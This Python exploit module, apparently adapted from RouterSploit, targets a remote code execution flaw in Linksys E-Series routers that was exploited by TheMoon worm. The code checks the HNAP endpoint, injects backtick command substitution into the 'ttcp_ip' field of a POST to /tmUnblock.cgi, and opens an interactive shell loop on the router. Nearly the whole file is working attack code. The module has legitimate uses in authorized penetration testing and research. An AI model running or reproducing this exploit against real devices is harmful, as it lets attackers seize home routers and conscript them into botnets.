# rsf exploit module
# description: Module exploits remote code execution vulnerability in multiple Linksys E-Series devices. Vulnerability was actively used by TheMoon Worm.

import requests

class Exploit:
    __info__ = {
        "name": "Linksys E-Series TheMoon RCE",
        "description": "Module exploits remote code execution vulnerability in multiple Linksys E-Series "
                       "devices. Vulnerability was actively used by TheMoon Worm.",
        "authors": (
            "Johannes Ullrich",  
            "Rew",  
            "infodox",  
            "Michael Messner",  
            "juan vazquez",  
            "Marcin Bury",  
        ),
        "references": (
            "https://www.exploit-db.com/exploits/31683/",
            "https://www.securityfocus.com/bid/65585",
            "https://packetstormsecurity.com/files/125253",
            "https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633",
        ),
        "devices": (
            "Linksys E900",
            "Linksys E1000",
            "Linksys E1200",
            "Linksys E1500",
            "Linksys E1550",
            "Linksys E2000",
            "Linksys E2100L",
            "Linksys E2500",
            "Linksys E3000",
            "Linksys E3200",
            "Linksys E4200",
        )
    }

    def __init__(self, target, arch="mipsle"):
        self.target = target
        self.arch = arch

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        cmd = "-h `{}`".format(cmd)
        data = {
            "submit_button": "",
            "change_action": "",
            "action": "",
            "commit": "0",
            "ttcp_num": "2",
            "ttcp_size": "2",
            "ttcp_ip": cmd,
            "StartEPI": "1",
        }

        response = requests.post(self.target + "/tmUnblock.cgi", data=data)
        return response.text

    def check(self):
        response = requests.get(self.target + "/HNAP1/")
        if response and "ModelName" not in response.text:
            return False

        response = requests.get(self.target + "/tmUnblock.cgi")
        if response.status_code in [200, 301, 302]:
            return True
        return False

    def shell(self):
        while True:
            cmd = input("Shell> ")
            if cmd == "exit":
                break
            result = self.execute(cmd)
            print(result)

